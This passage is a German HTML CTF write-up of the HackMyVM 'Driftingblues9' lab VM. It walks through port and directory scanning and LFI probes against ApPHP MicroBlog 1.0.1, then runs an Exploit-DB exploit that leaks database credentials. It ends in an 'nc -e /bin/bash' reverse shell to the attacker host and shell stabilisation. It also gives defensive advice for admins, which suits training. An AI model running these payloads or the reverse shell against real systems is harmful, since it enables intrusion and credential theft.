@@ -1,0 +1,844 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Driftingblues9 - HackMyVM - Bericht</title> <!-- Angepasster Titel -->
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <!-- Header mit angepasstem Titel und Schwierigkeitsgrad -->
+    <div class="header-bg"> <!-- Hintergrundfarbe wird durch CSS gesteuert (#03b5f5) -->
+        <h1>Driftingblues9 - HackMyVM - Level: Easy - Bericht</h1>
+        <div class="level-container">
+            <h2>Easy</h2> <!-- Schwierigkeitsgrad ohne Inline-Style, Farbe (rot) durch CSS -->
+            <div class="circle"> <!-- Segmentfarben (rot) durch CSS -->
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div> <!-- Hintergrundfarbe (passend zu Header) durch CSS -->
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <!-- Tools Liste basierend auf dem Text -->
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">python3 http.server</div>
+                <div class="tool-item">python2 (exploit)</div>
+                <div class="tool-item">nc (netcat)</div>
+                <div class="tool-item">pty (python)</div>
+                <div class="tool-item">stty</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">grep</div>
+                <div class="tool-item">su</div>
+                <div class="tool-item">wget</div>
+                <div class="tool-item">gdb</div>
+                <div class="tool-item">metasploit pattern_create</div>
+                <div class="tool-item">metasploit pattern_offset</div>
+                <div class="tool-item">python (payload)</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <!-- Inhaltsverzeichnis-Links -->
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#initial-access">Initial Access (Exploit & Reverse Shell)</a></li>
+                <li><a href="#privilege-escalation-clapton">Privilege Escalation (zu clapton)</a></li>
+                <li><a href="#privilege-escalation-root">Privilege Escalation (zu root)</a></li>
+                <li><a href="#proof-of-concept">Proof of Concept (Root Access via Buffer Overflow)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Der Befehl `arp-scan -l` wird verwendet, um aktive Hosts im lokalen Netzwerksegment zu entdecken. Er sendet ARP-Requests und listet die antwortenden Geräte mit ihren IP- und MAC-Adressen auf.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Ein Host mit der IP-Adresse 192.168.2.131 und der MAC-Adresse 08:00:27:20:a9:f5 (PCS Systemtechnik GmbH / Oracle VirtualBox) wurde identifiziert. Dies ist unser Zielsystem.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Die Ziel-IP ist bekannt. Führe als Nächstes einen detaillierten Port-Scan durch, um offene Dienste zu identifizieren.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Implementieren Sie Netzwerküberwachung, um ungewöhnliche ARP-Aktivitäten zu erkennen. Segmentieren Sie das Netzwerk, um die Reichweite solcher Scans zu begrenzen.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+192.168.2.131	08:00:27:20:a9:f5	PCS Systemtechnik GmbH
+                    </pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Ein umfassender Nmap-Scan wird auf die Ziel-IP 192.168.2.131 angewendet.
+                *   `-sS`: TCP SYN Scan (Stealth Scan).
+                *   `-sC`: Führt Standard-Nmap-Skripte aus.
+                *   `-T5`: Sehr schnelles Timing (potenziell ungenau/auffällig).
+                *   `-A`: Aktiviert OS-Erkennung (-O), Versionserkennung, Skript-Scanning und Traceroute. (Beachte: `-A` beinhaltet `-O`, daher ist `-AO` redundant, Nmap führt einfach `-A` aus).
+                *   `-p-`: Scannt alle 65535 TCP-Ports.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Nmap fand drei offene TCP-Ports:
+                *   **Port 80 (HTTP):** Apache httpd 2.4.10 (Debian). Die Webseite wird von "ApPHP MicroBlog" generiert (Version unklar, `vCURRENT_VERSION` ist wahrscheinlich ein Platzhalter). Das `PHPSESSID`-Cookie hat das `HttpOnly`-Flag nicht gesetzt, was es anfällig für Diebstahl durch Cross-Site-Scripting (XSS) machen könnte.
+                *   **Port 111 (rpcbind):** Der RPC Portmapper ist offen. Dies ist oft ein Zeichen für laufende NFS-Dienste oder andere RPC-basierte Dienste. Die `rpcinfo`-Ausgabe listet die registrierten RPC-Programme auf, einschließlich `status` (RPC #100024).
+                *   **Port 47756 (status):** Ein hoch nummerierter Port, der den `status`-Dienst (RPC #100024) bereitstellt, wie von `rpcbind` angezeigt.
+                Die OS-Erkennung deutet auf Linux Kernel 3.x oder 4.x hin. Die MAC-Adresse bestätigt die VirtualBox-Instanz.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Die ApPHP MicroBlog-Anwendung auf Port 80 ist das primäre Angriffsziel. Suche nach bekannten Schwachstellen für diese Software. Untersuche die RPC-Dienste auf mögliche Enumerations- oder Exploit-Möglichkeiten (z.B. NFS-Shares auflisten, falls vorhanden). Die fehlende `HttpOnly`-Flagge ist ein potenzieller Befund, aber weniger kritisch als eine Serverside-Schwachstelle.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Halten Sie die Webserver-Software (Apache) und die Webanwendung (ApPHP MicroBlog) auf dem neuesten Stand. Setzen Sie das `HttpOnly`-Flag für Session-Cookies, um XSS-Risiken zu mindern. Schließen Sie unnötige Ports wie `rpcbind` und den `status`-Dienst, wenn sie nicht benötigt werden. Beschränken Sie den Zugriff auf RPC-Dienste auf vertrauenswürdige Hosts.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -T5 -A -O 192.168.2.131 -p-</span></div> <!-- -AO zu -A -O korrigiert für Klarheit, Funktion bleibt gleich -->
+                    <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-18 13:43 CEST
+Nmap scan report for debian (192.168.2.131)
+Host is up (0.00016s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT      STATE SERVICE VERSION
+80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
+|_http-generator: ApPHP MicroBlog vCURRENT_VERSION
+| http-title: ApPHP MicroBlog
+|_http-server-header: Apache/2.4.10 (Debian)
+| http-cookie-flags:
+|   /:
+|     PHPSESSID:
+|_      httponly flag not set
+111/tcp   open  rpcbind 2-4 (RPC #100000)
+| rpcinfo:
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100000  3,4          111/tcp6  rpcbind
+|   100000  3,4          111/udp6  rpcbind
+|   100024  1          44916/udp6  status
+|   100024  1          47756/tcp   status
+|   100024  1          47875/tcp6  status
+|_  100024  1          58099/udp   status
+47756/tcp open  status  1 (RPC #100024)
+MAC Address: 08:00:27:20:A9:F5 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.2 - 4.9
+Network Distance: 1 hop
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.16 ms debian (192.168.2.131)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 34.52 seconds
+                    </pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Gobuster wird eingesetzt, um Verzeichnisse und Dateien auf dem Webserver zu finden.
+                *   `dir`: Verzeichnis-/Datei-Bruteforcing-Modus.
+                *   `-u http://192.168.2.131`: Ziel-URL.
+                *   `-x ...`: Eine lange Liste von Dateierweiterungen, nach denen zusätzlich gesucht werden soll.
+                *   `-w "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"`: Wortliste.
+                *   `-b '403,404'`: Statuscodes, die ignoriert werden sollen (Blacklist).
+                *   `-e`: Zeigt volle URLs an.
+                *   `--no-error`: Unterdrückt Fehlermeldungen (z.B. bei Verbindungsproblemen).
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Gobuster fand zahlreiche interessante Pfade:
+                *   `/index.php`: Die Hauptseite der MicroBlog-Anwendung.
+                *   `/images`, `/docs`, `/page`, `/admin`, `/license`, `/js`, `/include`, `/backup`, `/styles`, `/wysiwyg`, `/mails`: Verzeichnisse (Status 301 Redirect zu Pfad mit `/`). Besonders `/admin`, `/include` und `/backup` könnten interessant sein.
+                *   `/rss.xml`, `/README.txt`, `/INSTALL.txt`: Statische Dateien, die Informationen über die Anwendung oder Konfiguration enthalten könnten.
+                *   `/header.php` (Status 200), `/footer.php` (Status 500): Direkter Zugriff auf PHP-Dateien. Ein 500er-Fehler bei `footer.php` könnte auf einen Programmierfehler oder eine fehlende Abhängigkeit hindeuten, wenn die Datei direkt aufgerufen wird.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Untersuche die gefundenen Verzeichnisse, insbesondere `/admin` (Login-Seite?), `/include` (Quellcode?), `/backup` (alte Backups?). Lese den Inhalt von `README.txt` und `INSTALL.txt`, um mehr über die Anwendung und potenzielle Standardkonfigurationen zu erfahren. Der direkte Zugriff auf PHP-Dateien und der 500er-Fehler bei `footer.php` deuten möglicherweise auf LFI/RFI-Schwachstellen oder Probleme bei der direkten Ausführung hin.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Beschränken Sie den Zugriff auf sensible Verzeichnisse wie `/admin`, `/include`, `/backup` (z.B. durch `.htaccess` oder Webserver-Konfiguration). Erlauben Sie keinen direkten Zugriff auf inkludierte PHP-Dateien (`header.php`, `footer.php`). Stellen Sie sicher, dass keine sensiblen Informationen in `README` oder `INSTALL`-Dateien auf dem Produktivserver verbleiben. Deaktivieren Sie Directory Listing.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://192.168.2.131 -x txt,php,rar,zip,tar,pub,xls,docx,doc,sql,db,mdb,asp,aspx,accdb,bat,ps1,exe,sh,py,pl,gz,jpeg,jpg,png,html,phtml,xml,csv,dll,pdf,raw,rtf,xlsx,zip,kdbx -w "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"  -b '403,404' -e --no-error</span></div>
+                    <pre>
+Gobuster v3.5
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+[+] Url:                     http://192.168.2.131
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Negative Status codes:   403,404
+[+] User Agent:              gobuster/3.5
+[+] Extensions:              rar,pl,doc,accdb,exe,sh,py,html,aspx,png,dll,txt,tar,docx,xml,raw,zip,mdb,bat,ps1,jpg,pdf,rtf,gz,phtml,csv,pub,xlsx,kdbx,php,xls,sql,db,asp,jpeg
+[+] Expanded:                true
+[+] Timeout:                 10s
+[+] No Error Mode:           true
+===============================================================
+2023/04/18 13:43:39 Starting gobuster in directory enumeration mode
+===============================================================
+http://192.168.2.131/index.php            (Status: 200) [Size: 5654]
+http://192.168.2.131/images               (Status: 301) [Size: 315] [--> http://192.168.2.131/images/]
+http://192.168.2.131/rss.xml              (Status: 200) [Size: 1728]
+http://192.168.2.131/docs                 (Status: 301) [Size: 313] [--> http://192.168.2.131/docs/]
+http://192.168.2.131/page                 (Status: 301) [Size: 313] [--> http://192.168.2.131/page/]
+http://192.168.2.131/header.php           (Status: 200) [Size: 13]
+http://192.168.2.131/admin                (Status: 301) [Size: 314] [--> http://192.168.2.131/admin/]
+http://192.168.2.131/footer.php           (Status: 500) [Size: 614]
+http://192.168.2.131/license              (Status: 301) [Size: 316] [--> http://192.168.2.131/license/]
+http://192.168.2.131/README.txt           (Status: 200) [Size: 975]
+http://192.168.2.131/js                   (Status: 301) [Size: 311] [--> http://192.168.2.131/js/]
+http://192.168.2.131/include              (Status: 301) [Size: 316] [--> http://192.168.2.131/include/]
+http://192.168.2.131/backup               (Status: 301) [Size: 315] [--> http://192.168.2.131/backup/]
+http://192.168.2.131/styles               (Status: 301) [Size: 315] [--> http://192.168.2.131/styles/]
+http://192.168.2.131/INSTALL.txt          (Status: 200) [Size: 1201]
+http://192.168.2.131/wysiwyg              (Status: 301) [Size: 316] [--> http://192.168.2.131/wysiwyg/]
+http://192.168.2.131/mails                (Status: 301) [Size: 314] [--> http://192.168.2.131/mails/]
+
+===============================================================
+2023/04/18 13:57:46 Finished
+===============================================================
+                    </pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access (Exploit & Reverse Shell)</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Dieser Abschnitt beschreibt die Untersuchung und Ausnutzung der ApPHP MicroBlog-Anwendung.
+                1.  **IP-Adresse des Angreifers:** Der Befehl `ip a` (Ausgabe nicht gezeigt, aber impliziert) wird ausgeführt, um die eigene IP-Adresse (192.168.2.130) zu ermitteln, die später für die Reverse Shell benötigt wird.
+                2.  **Anwendungs-URLs:** Die Struktur der URLs (`index.php?page=posts&cat_id=1`, `index.php?page=login`) deutet auf eine mögliche Local File Inclusion (LFI) oder Remote File Inclusion (RFI) Schwachstelle im `page`-Parameter hin.
+                3.  **LFI/RFI-Test (Vorbereitung):** Eine Testdatei `test.txt` wird erstellt (`echo test > test.txt`) und ein Python-HTTP-Server (`python3 -m http.server 80`) wird gestartet, um diese Datei bereitzustellen.
+                4.  **Versionsinformation:** Ein HTML-Kommentar im Quellcode (`<!-- This script was generated by ApPHP MicroBlog v.1.0.1 ... -->`) verrät die exakte Version: 1.0.1.
+                5.  **LFI-Test (Versuch 1):** Es wird versucht, über den `page`-Parameter auf `/etc/passwd` zuzugreifen (`page=../../../../../../../../../etc/passwd`). Dies schlägt fehl.
+                6.  **LFI/RFI-Test (Versuch 2):** Es wird versucht, die Testdatei vom eigenen HTTP-Server via LFI/RFI zu laden (`page=file:///192.168.2.130/test.txt`). Dies löst eine Sicherheitsmeldung aus ("A hacking attempt has been detected."), was darauf hindeutet, dass die Anwendung einen Schutzmechanismus gegen einfache LFI/RFI-Versuche hat, aber möglicherweise anfällig ist.
+                7.  **Exploit-Suche:** Eine Suche (vermutlich auf Exploit-DB) führt zum Exploit `https://www.exploit-db.com/exploits/33070`. Dieser Exploit zielt auf ApPHP MicroBlog 1.0.1 ab und scheint eine Kombination aus LFI und Code Execution zu sein.
+                8.  **Exploit-Vorbereitung:** Der Exploit-Code wird als `apPHP.py` gespeichert (`vi apPHP.py`). Der Versuch, ihn mit `python3` auszuführen (`python3 --help apPHP.py`), schlägt fehl und zeigt nur die Python3-Hilfe, was darauf hindeutet, dass der Exploit für Python 2 geschrieben ist.
+                9.  **Exploit-Ausführung:** Der Exploit wird mit `python2` gestartet: `python2 apPHP.py http://192.168.2.131/index.php`.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Enumeration und die Tests deuten stark auf eine LFI-Schwachstelle im `page`-Parameter hin, die durch einen Filter geschützt ist. Die Entdeckung der exakten Version (1.0.1) und des passenden Exploits (33070) ist ein entscheidender Durchbruch. Der Exploit bestätigt die Schwachstelle (`[+] Website is vulnerable`), extrahiert sensible Informationen über `phpinfo()` (PHP-Version 5.6.40, Apache 2.4.10, `allow_url_fopen` ist 'On', aber `allow_url_include` ist 'Off', was RFI erschwert, `disable_functions` listet viele gefährliche Funktionen auf) und findet Konfigurationsdatenbank-Credentials (`clapton`:`yaraklitepe`) in `include/base.inc.php` mittels LFI. Noch wichtiger ist, dass der Exploit bestätigt, dass Remote Code Execution (RCE) über die `system()`-Funktion möglich ist (`[+] Remote exec is working with system() :)`). Der Exploit bietet eine interaktive Shell, um Befehle als `www-data`-Benutzer auszuführen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nutze die interaktive Shell des Exploits, um eine stabilere Reverse Shell zu bekommen. Die gefundenen Datenbank-Credentials (`clapton`:`yaraklitepe`) sind extrem wertvoll und könnten für spätere Privilege Escalation verwendet werden.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Aktualisieren Sie die ApPHP MicroBlog-Anwendung dringend auf eine gepatchte Version oder ersetzen Sie sie. Deaktivieren Sie `allow_url_fopen` in der `php.ini`, wenn es nicht benötigt wird. Überprüfen und bereinigen Sie alle Benutzereingaben (insbesondere GET/POST-Parameter wie `page`) rigoros, um LFI und RCE zu verhindern. Entfernen Sie sensible Informationen wie Datenbank-Credentials aus öffentlich zugänglichen Bereichen oder Konfigurationsdateien im Web-Root.
+            </p>
+            <!-- Separating the different steps for clarity -->
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ip a</span></div>
+                    <pre>
+192.168.2.130 <!-- Angenommene Ausgabe, wichtig für Reverse Shell -->
+                    </pre>
+                    <pre>
+# Beobachtete URLs und LFI/RFI Tests
+http://192.168.2.131/index.php?page=posts&cat_id=1
+http://192.168.2.131/index.php?page=login
+
+<!-- Gefundener Kommentar im Seitenquelltext -->
+<!-- This script was generated by ApPHP MicroBlog v.1.0.1
+(http://www.apphp.com/php-microblog/) -->
+
+# LFI Test 1 (Fehlgeschlagen)
+page=../../../../../../../../../etc/passwd
+
+# LFI Test 2 (Blockiert)
+http://192.168.2.131/index.php?page=file:///192.168.2.130/test.txt
+<!-- Ausgabe im Browser -->
+A hacking attempt has been detected. For security reasons,
+we're blocking any code execution.
+                    </pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">echo test > test.txt</span></div>
+                    <pre></pre>
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">python3 -m http.server 80</span></div>
+                    <pre>
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+                    </pre>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <pre>
+# Exploit gefunden: https://www.exploit-db.com/exploits/33070
+                    </pre>
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">vi apPHP.py</span></div>
+                    <pre># Exploit Code hier einfügen...</pre>
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">python3 --help apPHP.py</span></div>
+                    <pre>
+usage: python3 [option] ... [-c cmd | -m mod | file | -] [arg] ...
+Options (and corresponding environment variables):
+-b     : issue warnings about str(bytes_instance), str(bytearray_instance)
+... (Rest der Python3 Hilfe ausgelassen) ...
+                    </pre>
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">python2 apPHP.py http://192.168.2.131/index.php</span></div>
+                    <pre>
+-= LOTFREE exploit for ApPHP MicroBlog 1.0.1 (Free Version) =-
+original exploit by Jiko : http://www.exploit-db.com/exploits/33030/
+[] Testing for vulnerability...
+[+] Website is vulnerable
+
+[] Fecthing phpinfo
+PHP Version 5.6.40-0+deb8u12
+System   Linux debian 3.16.0-4-586 #1 Debian 3.16.51-2 (2017-12-03) i686
+Loaded Configuration File   /etc/php5/apache2/php.ini
+Apache Version   Apache/2.4.10 (Debian)
+User/Group   www-data(33)/33
+Server Root   /etc/apache2
+DOCUMENT_ROOT   /var/www/html
+PHP Version   5.6.40-0+deb8u12
+allow_url_fopen  On  On
+allow_url_include  Off  Off
+disable_functions  pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,  pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,
+open_basedir   no value    no value
+System V Message based IPC   Wez Furlong
+System V Semaphores   Tom May
+System V Shared Memory   Christian Cartus
+
+[] Fetching include/base.inc.php
+
+<?php
+			// DATABASE CONNECTION INFORMATION
+			define('DATABASE_HOST', 'localhost');	        // Database host
+			define('DATABASE_NAME', 'microblog');	        // Name of the database to be used
+			define('DATABASE_USERNAME', 'clapton');	// User name for access to database
+			define('DATABASE_PASSWORD', '<span class="password">yaraklitepe</span>');	// Password for access to database
+			define('DB_ENCRYPT_KEY', 'p52plaiqb8');		// Database encryption key
+			define('DB_PREFIX', 'mb101_');		    // Unique prefix of all table names in the database
+			?>
+
+
+[] Testing remote execution
+[+] Remote exec is working with system() :)
+Submit your commands, type exit to quit
+                    </pre>
+                    <!-- Interaktive Shell des Exploits -->
+                    <div class="prompt" style="color: #ffffff;">$<span class="command"> id</span></div>
+                    <pre>
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+                    </pre>
+                     <div class="prompt" style="color: #ffffff;">$<span class="command"> nc -e /bin/bash 192.168.2.130 4444</span></div>
+                     <pre>
+# (Keine Ausgabe hier, Verbindung wird im Hintergrund aufgebaut)
+                    </pre>
+                </div>
+            </div>
+
+             <p class="analysis">
+                <strong>Analyse:</strong> Nachdem die RCE über den Exploit bestätigt wurde, wird eine Reverse Shell zum Angreifer-Rechner (192.168.2.130) auf Port 4444 aufgebaut (`nc -e /bin/bash 192.168.2.130 4444`). Auf dem Angreifer-Rechner muss ein Listener laufen (`nc -lvnp 4444`). Die erhaltene Shell ist oft nicht vollständig interaktiv (keine Tab-Vervollständigung, kein `su`, Probleme mit Editoren). Daher werden Schritte zur Stabilisierung unternommen:
+                1.  **Python für PTY:** `which python` prüft, ob Python vorhanden ist. `python -c 'import pty;pty.spawn("/bin/bash")'` startet eine neue Bash-Shell innerhalb eines Pseudo-Terminals (PTY), was die Interaktivität verbessert.
+                2.  **TERM-Variable setzen:** `export TERM=xterm` teilt der Shell mit, dass sie mit einem xterm-kompatiblen Terminal kommuniziert, was für viele textbasierte Anwendungen wichtig ist.
+                3.  **Shell in den Hintergrund legen:** Strg+Z legt die `nc`-Sitzung (und damit die Reverse Shell) in den Hintergrund.
+                4.  **Terminal-Einstellungen anpassen:** Auf dem Angreifer-Rechner wird `stty raw -echo` ausgeführt, um das lokale Terminal in den Raw-Modus zu versetzen (Tastatureingaben direkt weiterleiten) und das Echo zu deaktivieren.
+                5.  **Shell in den Vordergrund holen:** `fg` holt den `nc`-Job wieder in den Vordergrund. Ein `reset` kann helfen, die Terminalanzeige zu korrigieren. Die Shell ist nun stabiler und interaktiver.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Schritte zur Erlangung einer Reverse Shell und deren Stabilisierung waren erfolgreich. Wir haben nun eine funktionierende Shell als Benutzer `www-data` auf dem Zielsystem. Der initiale Zugriff ist damit abgeschlossen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Führe nun Enumerationsschritte als `www-data` durch. Suche nach Konfigurationsdateien, Passwörtern, SUID-Dateien, Cronjobs und anderen Möglichkeiten zur Privilege Escalation. Die zuvor gefundenen Datenbank-Credentials (`clapton`:`yaraklitepe`) sind ein heißer Kandidat für den nächsten Schritt.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Neben den bereits genannten Maßnahmen zur Absicherung der Webanwendung, überwachen Sie ausgehende Netzwerkverbindungen vom Webserver, um Reverse Shells zu erkennen. Härten Sie das System, indem Sie unnötige Tools wie `netcat` entfernen oder deren Ausführung einschränken, wenn möglich. Verwenden Sie Intrusion Detection/Prevention Systeme (IDS/IPS).
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+# --- Auf dem Angreifer-Rechner ---
+# nc -lvnp 4444
+# listening on [any] 4444 ...
+# connect to [192.168.2.130] from (UNKNOWN) [192.168.2.131] 4XXXX
+
+# --- Befehle in der Reverse Shell (Zielsystem) ---
+                    </pre>
+                     <div class="prompt" style="color: #ffffff;">$<span class="command"> which python</span></div>
+                     <pre>/usr/bin/python</pre>
+                     <div class="prompt" style="color: #ffffff;">$<span class="command"> python -c 'import pty;pty.spawn("/bin/bash")'</span></div>
+                     <!-- Prompt ändert sich oft nach pty.spawn -->
+                    <div class="prompt" style="color: #ffffff;">www-data@debian:/var/www/html$ <span class="command"> export TERM=xterm</span></div>
+                    <pre>export TERM=xterm</pre> <!-- Manchmal wird der Befehl wiederholt -->
+                    <div class="prompt" style="color: #ffffff;">www-data@debian:/var/www/html$ <span class="command"> ^Z</span></div> <!-- Strg+Z -->
+                    <pre>
+# --- Zurück auf dem Angreifer-Rechner ---
+zsh: suspended  nc -lvnp 4444
+                    </pre>
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">stty raw -echo;fg</span></div>
+                    <pre>
+[1]  + continued  nc -lvnp 4444
+reset # Eingabe in der nun stabilisierten Shell
+                    </pre>
+                    <div class="prompt" style="color: #ffffff;">www-data@debian:/var/www/html$ <span class="command"> </span></div> <!-- Stabiler Prompt -->
+                </div>
+            </div>
+        </section>
+
+        <section id="privilege-escalation-clapton">
+            <h2>Privilege Escalation (zu clapton)</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Nach der Stabilisierung der Shell als `www-data` werden erste Enumerationsschritte durchgeführt.
+                *   `ls -la`: Listet den Inhalt des aktuellen Verzeichnisses (`/var/www/html`) detailliert auf. Zeigt Dateiberechtigungen, Eigentümer und Gruppenzugehörigkeiten. Auffällig ist, dass viele Dateien/Verzeichnisse `root:root` gehören, was für `www-data` ungewöhnlich ist, aber die `include`-Ordnerberechtigungen (`drwxrwxrwx`) erlauben jedem das Schreiben.
+                *   `sudo -l`: Versucht aufzulisten, welche Befehle `www-data` mit `sudo` ausführen darf.
+                *   `find / -type f -perm -4000 -ls 2>/dev/null`: Sucht nach SUID-Dateien im gesamten System.
+                *   `ls /home`: Listet die Benutzerverzeichnisse auf.
+                *   `ss -tlpna`: Zeigt aktive Netzwerk-Sockets (TCP-Listen, Verbindungen etc.) an. Bestätigt den laufenden MySQL-Server (Port 3306) und die bestehende Reverse-Shell-Verbindung.
+                *   Untersuchung des Quellcodes (`index.php`, `include/base.inc.php`): Die Analyse des Codes (nicht vollständig gezeigt, aber impliziert) bestätigt die Verwendung der Datenbank-Credentials.
+                *   `grep -i 'pass|user' include/base.inc.php`: Sucht gezielt nach Zeilen mit "pass" oder "user" (Groß-/Kleinschreibung ignorierend) in der Konfigurationsdatei.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> `sudo -l` schlägt fehl (`command not found`), was bedeutet, dass `sudo` entweder nicht installiert ist oder `www-data` keine Rechte hat (wahrscheinlicher ersteres auf diesem älteren Debian). Die SUID-Suche zeigt Standard-Binaries, aber nichts direkt Ausnutzbares für `www-data`. Die Entdeckung des Home-Verzeichnisses `/home/clapton` bestätigt den Benutzernamen aus den Datenbank-Credentials. Die `grep`-Suche extrahiert erfolgreich die Datenbank-Credentials aus der `base.inc.php`: Benutzer `clapton` mit Passwort `<span class="password">yaraklitepe</span>`. Dies ist der Schlüssel zur nächsten Stufe.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Versuche, mit den gefundenen Credentials (`clapton`:`yaraklitepe`) den Benutzer zu wechseln, entweder über `su clapton` oder per SSH (falls SSH für diesen Benutzer aktiviert ist).
+                <br>
+                <strong>Empfehlung (Admin):</strong> Speichern Sie niemals Klartext-Passwörter in Konfigurationsdateien im Web-Root. Verwenden Sie sicherere Methoden zur Speicherung von Credentials (z.B. Umgebungsvariablen, verschlüsselte Konfigurationsdateien außerhalb des Web-Roots, Secret-Management-Systeme). Setzen Sie korrekte Dateiberechtigungen im Web-Root (`www-data` sollte nur Schreibrechte haben, wo absolut notwendig). Installieren Sie `sudo` und konfigurieren Sie es nach dem Least-Privilege-Prinzip, falls benötigt.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt" style="color: #ffffff;">www-data@debian:/var/www/html$ <span class="command">ls -la</span></div>
+                     <pre>
+total 84
+drwxr-xr-x 13 root root 4096 May  9  2021 .
+drwxr-xr-x  3 root root 4096 May  9  2021 ..
+-rw-r--r--  1 root root 1039 May 20  2009 .htaccess
+-rw-r--r--  1 root root 1201 Jan 29  2014 INSTALL.txt
+-rw-r--r--  1 root root  975 Jan 29  2014 README.txt
+drwxr-xr-x  3 root root 4096 May  9  2021 admin
+drwxr-xr-x  2 root root 4096 May  9  2021 backup
+drwxr-xr-x  2 root root 4096 May  9  2021 docs
